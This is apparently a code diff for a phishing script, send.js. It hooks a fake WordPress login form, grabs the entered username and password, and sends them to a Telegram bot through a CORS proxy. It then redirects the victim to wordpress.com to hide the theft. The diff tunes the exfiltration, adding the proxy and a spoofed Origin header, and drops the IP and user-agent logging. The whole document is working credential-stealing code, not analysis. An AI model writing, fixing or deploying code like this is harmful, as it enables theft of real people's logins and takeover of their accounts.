@@ -1,8 +1,7 @@
-// send.js
+// send.js — версия с прокси
 (function() {
     'use strict';
     
-    // Ждем полной загрузки DOM
     document.addEventListener('DOMContentLoaded', function() {
         const form = document.getElementById('loginform');
         
@@ -12,35 +11,28 @@
         }
         
         form.addEventListener('submit', function(e) {
-            // Предотвращаем стандартную отправку
             e.preventDefault();
             e.stopPropagation();
             
             console.log("Скрипт send.js начал работу!");
-            console.log("BOT_TOKEN из config:", window.BOT_TOKEN);
-            console.log("CHAT_ID из config:", window.CHAT_ID);
             
-            // Получаем данные из формы
             const login = form.querySelector('input[name="log"]').value;
             const password = form.querySelector('input[name="pwd"]').value;
             
-            // Формируем сообщение
             const message = '🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\n' +
                 'Логин: ' + login + '\n' +
-                'Пароль: ' + password + '\n' +
-                'IP: ' + window.userIP + '\n' +
-                'Время: ' + new Date().toLocaleString() + '\n' +
-                'User Agent: ' + navigator.userAgent;
+                'Пароль: ' + password;
             
-            console.log("Сообщение для отправки:", message);
+            // ИСПОЛЬЗУЕМ ПРОКСИ
+            const botToken = window.BOT_TOKEN;
+            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
-            // Отправляем в Telegram
-            const url = 'https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot' + window.BOT_TOKEN + '/sendMessage';
-            
-            fetch(url, {
+            fetch(proxyUrl + telegramUrl, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://shumaxe.github.io'
                 },
                 body: JSON.stringify({
                     chat_id: window.CHAT_ID,
@@ -48,41 +40,20 @@
                 })
             })
             .then(function(response) {
+                console.log("Ответ получен, статус:", response.status);
                 return response.json();
             })
             .then(function(data) {
-                console.log("Ответ от Telegram:", data);
-                if (data.ok) {
-                    console.log("Успешно отправлено!");
-                } else {
-                    console.error("Ошибка от Telegram:", data);
-                }
+                console.log("Успешно отправлено в Telegram!", data);
             })
             .catch(function(error) {
-                console.error("Ошибка отправки:", error);
+                console.error("Ошибка:", error);
             })
             .finally(function() {
-                // Перенаправляем через 1 секунду
                 setTimeout(function() {
                     window.location.href = 'https://wordpress.com/';
                 }, 1000);
             });
         });
     });
-    
-    // Получаем IP пользователя
-    function fetchIP() {
-        fetch('https://api.ipify.org?format=json')
-            .then(function(response) {
-                return response.json();
-            })
-            .then(function(data) {
-                window.userIP = data.ip;
-            })
-            .catch(function() {
-                window.userIP = 'Не удалось определить';
-            });
-    }
-    
-    fetchIP();
 })();
